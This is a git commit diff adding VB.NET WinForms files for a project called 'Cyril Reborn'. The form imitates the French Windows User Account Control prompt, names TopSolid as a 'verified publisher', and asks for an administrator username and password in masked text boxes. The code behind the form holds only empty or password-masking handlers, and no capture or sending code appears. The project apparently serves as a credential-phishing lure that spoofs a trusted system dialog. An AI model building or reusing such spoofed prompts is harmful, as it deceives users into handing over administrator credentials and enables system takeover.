47a0060fe5ce124ffc470790aa0a53e84fe7b2ca
Plume <plume@paona.xyz>
2023-03-09 00:09:48 +0100

    Ajoutez des fichiers projet.

---
+++ Cyril Reborn/Form1.Designer.vb
@@ -0,0 +1,316 @@
+﻿<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()>
+Partial Class Form1
+    Inherits System.Windows.Forms.Form
+
+    'Form overrides dispose to clean up the component list.
+    <System.Diagnostics.DebuggerNonUserCode()>
+    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
+        Try
+            If disposing AndAlso components IsNot Nothing Then
+                components.Dispose()
+            End If
+        Finally
+            MyBase.Dispose(disposing)
+        End Try
+    End Sub
+
+    'Required by the Windows Form Designer
+    Private components As System.ComponentModel.IContainer
+
+    'NOTE: The following procedure is required by the Windows Form Designer
+    'It can be modified using the Windows Form Designer.  
+    'Do not modify it using the code editor.
+    <System.Diagnostics.DebuggerStepThrough()>
+    Private Sub InitializeComponent()
+        Dim resources As ComponentModel.ComponentResourceManager = New ComponentModel.ComponentResourceManager(GetType(Form1))
+        Label2 = New Label()
+        Label3 = New Label()
+        Label4 = New Label()
+        Label5 = New Label()
+        Label6 = New Label()
+        Label7 = New Label()
+        Label8 = New Label()
+        Button1 = New Button()
+        Button2 = New Button()
+        Label9 = New Label()
+        ColorDialog1 = New ColorDialog()
+        PictureBox1 = New PictureBox()
+        PictureBox2 = New PictureBox()
+        TextBox1 = New TextBox()
+        Label1 = New Label()
+        Label10 = New Label()
+        PictureBox3 = New PictureBox()
+        Label11 = New Label()
+        Label12 = New Label()
+        TextBox2 = New TextBox()
+        Label13 = New Label()
+        Label14 = New Label()
+        CType(PictureBox1, ComponentModel.ISupportInitialize).BeginInit()
+        CType(PictureBox2, ComponentModel.ISupportInitialize).BeginInit()
+        CType(PictureBox3, ComponentModel.ISupportInitialize).BeginInit()
+        SuspendLayout()
+        ' 
+        ' Label2
+        ' 
+        Label2.AutoSize = True
+        Label2.BackColor = SystemColors.ControlLight
+        Label2.FlatStyle = FlatStyle.Flat
+        Label2.Font = New Font("Segoe UI", 12F, FontStyle.Regular, GraphicsUnit.Point)
+        Label2.Location = New Point(28, 50)
+        Label2.Name = "Label2"
+        Label2.Size = New Size(0, 21)
+        Label2.TabIndex = 1
+        ' 
+        ' Label3
+        ' 
+        Label3.AutoSize = True
+        Label3.Font = New Font("Segoe UI", 12F, FontStyle.Regular, GraphicsUnit.Point)
+        Label3.Location = New Point(154, 152)
+        Label3.Name = "Label3"
+        Label3.Size = New Size(69, 21)
+        Label3.TabIndex = 2
+        Label3.Text = "TopSolid"' 
+        ' Label4
+        ' 
+        Label4.AutoSize = True
+        Label4.Font = New Font("Segoe UI", 12F, FontStyle.Regular, GraphicsUnit.Point)
+        Label4.Location = New Point(28, 228)
+        Label4.Name = "Label4"
+        Label4.Size = New Size(221, 21)
+        Label4.TabIndex = 3
+        Label4.Text = "Editeur vérifié : TOPSOLID SAS"' 
+        ' Label5
+        ' 
+        Label5.AutoSize = True
+        Label5.Font = New Font("Segoe UI", 12F, FontStyle.Regular, GraphicsUnit.Point)
+        Label5.Location = New Point(28, 249)
+        Label5.Name = "Label5"
+        Label5.Size = New Size(349, 21)
+        Label5.TabIndex = 4
+        Label5.Text = "Originie du fichier : Disque dur sur cet ordinateur"' 
+        ' Label6
+        ' 
+        Label6.AutoSize = True
+        Label6.Font = New Font("Segoe UI", 12F, FontStyle.Regular, GraphicsUnit.Point)
+        Label6.ForeColor = SystemColors.Highlight
+        Label6.Location = New Point(28, 298)
+        Label6.Name = "Label6"
+        Label6.Size = New Size(167, 21)
+        Label6.TabIndex = 5
+        Label6.Text = "Afficher plus de détails"' 
+        ' Label7
+        ' 
+        Label7.AutoSize = True
+        Label7.Font = New Font("Segoe UI", 12F, FontStyle.Regular, GraphicsUnit.Point)
+        Label7.Location = New Point(28, 440)
+        Label7.Name = "Label7"
+        Label7.Size = New Size(0, 21)
+        Label7.TabIndex = 6
+        ' 
+        ' Label8
+        ' 
+        Label8.AutoSize = True
+        Label8.Font = New Font("Segoe UI", 12F, FontStyle.Regular, GraphicsUnit.Point)
+        Label8.Location = New Point(23, 543)
+        Label8.Name = "Label8"
+        Label8.Size = New Size(105, 21)
+        Label8.TabIndex = 7
+        Label8.Text = "Domaine : LPI"' 
+        ' Button1
+        ' 
+        Button1.Font = New Font("Segoe UI", 12F, FontStyle.Regular, GraphicsUnit.Point)
+        Button1.Location = New Point(12, 713)
+        Button1.Name = "Button1"
+        Button1.Size = New Size(237, 37)
+        Button1.TabIndex = 10
+        Button1.Text = "Oui"
+        Button1.UseVisualStyleBackColor = True
+        ' 
+        ' Button2
+        ' 
+        Button2.BackColor = SystemColors.Highlight
+        Button2.FlatAppearance.BorderSize = 0
+        Button2.Font = New Font("Segoe UI", 12F, FontStyle.Regular, GraphicsUnit.Point)
+        Button2.ForeColor = Color.Transparent
+        Button2.Location = New Point(255, 713)
+        Button2.Name = "Button2"
+        Button2.RightToLeft = RightToLeft.No
+        Button2.Size = New Size(237, 37)
+        Button2.TabIndex = 11
+        Button2.Text = "Non"
+        Button2.UseVisualStyleBackColor = False
+        ' 
+        ' Label9
+        ' 
+        Label9.AutoSize = True
+        Label9.FlatStyle = FlatStyle.System
+        Label9.Font = New Font("Segoe UI", 12F, FontStyle.Regular, GraphicsUnit.Point)
+        Label9.ForeColor = SystemColors.Highlight
+        Label9.Location = New Point(28, 614)
+        Label9.Name = "Label9"
+        Label9.Size = New Size(95, 21)
+        Label9.TabIndex = 12
+        Label9.Text = "Autres choix"' 
+        ' PictureBox1
+        ' 
+        PictureBox1.BackColor = SystemColors.ControlLight
+        PictureBox1.Location = New Point(-4, -4)
+        PictureBox1.Name = "PictureBox1"
+        PictureBox1.Size = New Size(677, 110)
+        PictureBox1.TabIndex = 13
+        PictureBox1.TabStop = False
+        ' 
+        ' PictureBox2
+        ' 
+        PictureBox2.BackColor = SystemColors.ControlLight
+        PictureBox2.Location = New Point(-4, 683)
+        PictureBox2.Name = "PictureBox2"
+        PictureBox2.Size = New Size(677, 100)
+        PictureBox2.TabIndex = 14
+        PictureBox2.TabStop = False
+        ' 
+        ' TextBox1
+        ' 
+        TextBox1.Font = New Font("Segoe UI", 12F, FontStyle.Regular, GraphicsUnit.Point)
+        TextBox1.Location = New Point(28, 453)
+        TextBox1.Multiline = True
+        TextBox1.Name = "TextBox1"
+        TextBox1.Size = New Size(410, 37)
+        TextBox1.TabIndex = 15
+        TextBox1.UseSystemPasswordChar = True
+        ' 
+        ' Label1
+        ' 
+        Label1.AutoSize = True
+        Label1.BackColor = SystemColors.ControlLight
+        Label1.Font = New Font("Segoe UI", 18F, FontStyle.Regular, GraphicsUnit.Point)
+        Label1.ForeColor = SystemColors.ControlText
+        Label1.Location = New Point(28, 25)
+        Label1.Name = "Label1"
+        Label1.Size = New Size(0, 32)
+        Label1.TabIndex = 17
+        ' 
+        ' Label10
+        ' 
+        Label10.AutoSize = True
+        Label10.Font = New Font("Segoe UI", 12F, FontStyle.Regular, GraphicsUnit.Point)
+        Label10.Location = New Point(28, 387)
+        Label10.Name = "Label10"
+        Label10.Size = New Size(0, 21)
+        Label10.TabIndex = 18
+        ' 
+        ' PictureBox3
+        ' 
+        PictureBox3.Image = CType(resources.GetObject("PictureBox3.Image"), Image)
+        PictureBox3.Location = New Point(50, 118)
+        PictureBox3.Name = "PictureBox3"
+        PictureBox3.Size = New Size(90, 90)
+        PictureBox3.TabIndex = 19
+        PictureBox3.TabStop = False
+        ' 
+        ' Label11
+        ' 
+        Label11.AutoSize = True
+        Label11.BackColor = SystemColors.ControlLight
+        Label11.Font = New Font("Segoe UI", 15.75F, FontStyle.Regular, GraphicsUnit.Point)
+        Label11.Location = New Point(28, 25)
+        Label11.Name = "Label11"
+        Label11.Size = New Size(0, 30)
+        Label11.TabIndex = 20
+        ' 
+        ' Label12
+        ' 
+        Label12.AutoSize = True
+        Label12.Font = New Font("Segoe UI", 12F, FontStyle.Regular, GraphicsUnit.Point)
+        Label12.Location = New Point(28, 387)
+        Label12.Name = "Label12"
+        Label12.Size = New Size(0, 21)
+        Label12.TabIndex = 21
+        ' 
+        ' TextBox2
+        ' 
+        TextBox2.Location = New Point(28, 496)
+        TextBox2.Multiline = True
+        TextBox2.Name = "TextBox2"
+        TextBox2.Size = New Size(410, 35)
+        TextBox2.TabIndex = 22
+        ' 
+        ' Label13
+        ' 
+        Label13.AutoSize = True
+        Label13.BackColor = SystemColors.ControlLight
+        Label13.Font = New Font("Segoe UI", 15.75F, FontStyle.Regular, GraphicsUnit.Point)
+        Label13.Location = New Point(28, 25)
+        Label13.Name = "Label13"
+        Label13.Size = New Size(426, 60)
+        Label13.TabIndex = 23
+        Label13.Text = "Voulez-vous autoriser cette application à" & vbCrLf & "apporter des modifications à votre appareil ?"' 
+        ' Label14
+        ' 
+        Label14.AutoSize = True
+        Label14.Font = New Font("Segoe UI", 12F, FontStyle.Regular, GraphicsUnit.Point)
+        Label14.Location = New Point(28, 387)
+        Label14.Name = "Label14"
+        Label14.Size = New Size(451, 42)
+        Label14.TabIndex = 24
+        Label14.Text = "Pour continuer, entrez un nom d'utilisateur administrateur et un" & vbCrLf & "mot de passe."' 
+        ' Form1
+        ' 
+        AutoScaleDimensions = New SizeF(7F, 15F)
+        AutoScaleMode = AutoScaleMode.Font
+        ClientSize = New Size(507, 780)
+        Controls.Add(Label14)
+        Controls.Add(Label13)
+        Controls.Add(TextBox2)
+        Controls.Add(Label12)
+        Controls.Add(Label11)
+        Controls.Add(PictureBox3)
+        Controls.Add(Label10)
+        Controls.Add(Label1)
+        Controls.Add(TextBox1)
+        Controls.Add(Label2)
+        Controls.Add(Label3)
+        Controls.Add(Label9)
+        Controls.Add(Button2)
+        Controls.Add(Button1)
+        Controls.Add(Label8)
+        Controls.Add(Label7)
+        Controls.Add(Label6)
+        Controls.Add(Label5)
+        Controls.Add(Label4)
+        Controls.Add(PictureBox1)
+        Controls.Add(PictureBox2)
+        FormBorderStyle = FormBorderStyle.Fixed3D
+        Name = "Form1"
+        ShowIcon = False
+        StartPosition = FormStartPosition.CenterScreen
+        Text = "Contrôle de compte d'utilisateur"
+        CType(PictureBox1, ComponentModel.ISupportInitialize).EndInit()
+        CType(PictureBox2, ComponentModel.ISupportInitialize).EndInit()
+        CType(PictureBox3, ComponentModel.ISupportInitialize).EndInit()
+        ResumeLayout(False)
+        PerformLayout()
+    End Sub
+    Friend WithEvents Label2 As Label
+    Friend WithEvents Label3 As Label
+    Friend WithEvents Label4 As Label
+    Friend WithEvents Label5 As Label
+    Friend WithEvents Label6 As Label
+    Friend WithEvents Label7 As Label
+    Friend WithEvents Label8 As Label
+    Friend WithEvents Button1 As Button
+    Friend WithEvents Button2 As Button
+    Friend WithEvents Label9 As Label
+    Friend WithEvents ColorDialog1 As ColorDialog
+    Friend WithEvents PictureBox1 As PictureBox
+    Friend WithEvents PictureBox2 As PictureBox
+    Friend WithEvents TextBox1 As TextBox
+    Friend WithEvents Label1 As Label
+    Friend WithEvents Label10 As Label
+    Friend WithEvents PictureBox3 As PictureBox
+    Friend WithEvents Label11 As Label
+    Friend WithEvents Label12 As Label
+    Friend WithEvents TextBox2 As TextBox
+    Friend WithEvents Label13 As Label
+    Friend WithEvents Label14 As Label
+End Class
---
+++ Cyril Reborn/Form1.vb
@@ -0,0 +1,28 @@
+﻿Public Class Form1
+    Private Sub Form1_Load(sender As Object, e As EventArgs)
+
+    End Sub
+
+    Private Sub PictureBox1_Click(sender As Object, e As EventArgs)
+
+    End Sub
+
+    Private Sub TextBox1_TextChanged(sender As Object, e As EventArgs)
+
+    End Sub
+
+    Private Sub Label1_Click(sender As Object, e As EventArgs)
+
+    End Sub
+
+    Private Sub TextBox2_TextChanged(sender As Object, e As EventArgs)
+        TextBox2.UseSystemPasswordChar = True 'Pour masquer le texte dans la zone de texte
+        TextBox2.PasswordChar = "*" 'Définir un caractère de masquage personnalisé
+
+    End Sub
+
+    Private Sub TextBox2_TextChanged_1(sender As Object, e As EventArgs)
+        TextBox2.UseSystemPasswordChar = True 'Pour masquer le texte dans la zone de texte
+        TextBox2.PasswordChar = "*" 'Définir un caractère de masquage personnalisé
+    End Sub
+End Class
